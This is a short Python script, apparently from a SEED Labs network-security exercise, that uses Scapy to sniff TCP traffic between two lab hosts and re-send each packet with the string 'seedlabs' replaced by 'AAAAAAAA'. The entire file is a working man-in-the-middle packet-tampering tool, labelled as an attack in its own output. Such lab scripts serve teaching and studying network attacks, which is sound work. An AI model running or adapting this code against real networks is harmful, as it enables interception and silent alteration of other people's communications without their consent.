#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "192.168.60.5"

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'seedlabs', b'AAAAAAAA')

       send(newpkt/newdata)
   else: 
       send(newpkt)

# Capture TCP packets from A to B
f = 'tcp and ether src {A} and ip dst {B}'.format(A=MAC_A, B=IP_B)
#f = 'tcp and ip src {A} and ip dst {B}'.format(A=IP_A, B=IP_B)
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

